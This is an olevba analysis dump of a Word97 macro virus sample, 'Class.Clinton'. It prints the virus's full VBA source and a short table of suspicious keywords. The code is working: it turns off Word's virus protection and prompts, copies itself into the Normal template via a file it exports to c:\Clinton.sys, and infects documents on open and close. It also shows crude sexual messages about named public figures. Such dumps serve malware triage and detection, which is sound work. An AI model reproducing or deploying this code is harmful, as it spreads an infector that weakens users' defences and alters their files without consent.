olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.Clinton
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.Clinton - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo out

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

Clintons = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

Clintonr = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If Clintonr > 70 And Clintons > 0 Then GoTo out

If Clintonr < 70 Then

    Set Monica = NormalTemplate.VBProject.VBComponents.Item(1)

    ActiveDocument.VBProject.VBComponents.Item(1).Name = Monica.Name

    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\Clinton.sys"

End If

If Clintons = 0 Then Set Monica = ActiveDocument.VBProject.VBComponents.Item(1)

Infection = Int(Rnd * 100)

If Infection = 99 Then MsgBox "Monica Blows Clinton! -=News@11=-"

If Day(Now) = 17 And (Month(Now) > 8) Then MsgBox "Today is Clinton & Monica Fuck-Fest Day!"

Monica.codemodule.AddFromFile ("c:\Clinton.sys")

With Monica.codemodule

    For x = 1 To 4

    .deletelines 1

    Next x

End With

If Clintonr < 70 Then

    With Monica.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 75, "Sub ToolsMacro()"

    End With

End If

With Monica.codemodule

    For x = 2 To 72 Step 2

    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow

    Next x

End With

out:

If Clintonr > 70 And Clintons = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode()
'Word97/Class.Clinton by Virus, Thanks Vic.
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

